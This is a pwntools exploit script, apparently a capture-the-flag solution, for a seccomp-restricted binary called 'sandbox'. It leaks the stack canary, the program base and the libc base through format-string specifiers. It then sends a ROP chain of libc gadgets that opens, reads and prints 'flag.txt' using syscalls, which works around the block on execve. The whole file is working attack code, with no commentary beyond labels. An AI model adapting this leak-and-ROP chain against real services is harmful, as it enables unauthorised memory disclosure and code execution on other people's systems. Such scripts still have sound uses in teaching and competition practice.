#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from warnings import filterwarnings

exe = './sandbox'
elf = context.binary = ELF(exe, checksec=False)
filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB: 
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *echo+189
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# ➜  Sandbox seccomp-tools dump ./sandbox 
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
#  0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
#  0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008
#  0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0008: 0x06 0x00 0x00 0x00000000  return KILL

io = start()
libc = elf.libc

# ===========================================================
#                   Leak Canary
# ===========================================================

# leak = ""
# for i in range(30, 50):
#     leak += f"{i}=%{i}$p "

# io.sendline(leak)


canary = "%37$p"
io.sendline(f"Canary={canary}")
io.recvuntil("Canary=")
leak = io.recvline().decode()
canary = int(leak, 16)
log.info("Leaked Canary Address: %#x", canary)

# ===========================================================
#                   Leak ELF Section 
# ===========================================================

section = "%40$p"
io.sendline(f"Section={section}")
io.recvuntil("Section=")
leak = io.recvline().decode()
rand = int(leak, 16)
elf.address = rand - (0x55b5b2000c4b - 0x000055b5b2000000)
data = elf.address + 2105344
log.info("Leaked ELF Address: %#x", rand)
log.info("ELF Base Address: %#x", elf.address)
log.info("Writable Section Address: %#x", data)


# ===========================================================
#                   Leak Libc
# ===========================================================

lib = "%3$p"
io.sendline(f"Libc={lib}")
io.recvuntil("Libc=")
stdin = io.recvline().decode()
leak = int(stdin, 16)
log.info("Leaked Libc Address: %#x", leak)

libc.address = leak - (0x7fe45ea44a80 - 0x00007fe45e872000)
log.info("Libc Base Address: %#x", libc.address)


# ===========================================================
#                       Gadgets
# ===========================================================

pop_rax = libc.address + 0x000000000003f0a7 # pop rax; ret; 
pop_rdi = libc.address + 0x0000000000027725 # pop rdi; ret; 
pop_rsi = libc.address + 0x0000000000028ed9 # pop rsi; ret; 
pop_rdx = libc.address + 0x00000000000fdc9d # pop rdx; ret; 
pop_rcx = libc.address + 0x0000000000101e17 # pop rcx; ret; 
pop_r15 = libc.address + 0x0000000000027724 # pop r15; ret; 
syscall = libc.address + 0x0000000000085f92 # syscall; ret; 

# ===========================================================
#                       ROP with Open, Read, Write 
# ===========================================================

offset = 0x48

payload = flat({
    offset: [
        # Overwrite RIP
        canary,
        b'A'*8,
        # Write flag to memory
        pop_rdi,
        data,
        elf.plt['gets'],
        # Open flag
        pop_rax,
        0x2,
        pop_rdi,
        data,
        pop_rsi,
        0x0,
        syscall, 
        # Read flag
        pop_rax,
        0x0,
        pop_rdi,
        0x3,
        pop_rsi,
        data,
        pop_rdx,
        0x30,
        syscall,
        # Write flag to stdout
        pop_rax,
        0x1,
        pop_rdi,
        0x1,
        pop_rsi,
        data,
        pop_rdx,
        0x30,
        syscall,
        # Exit
        pop_rax,
        0x3c,
        pop_rdi,
        0x0,
        syscall
    ]
})

io.sendline(payload)
io.sendline('x')
io.sendline("flag.txt")
io.recvline()

r = io.recvline().decode()
print(r)

io.close()
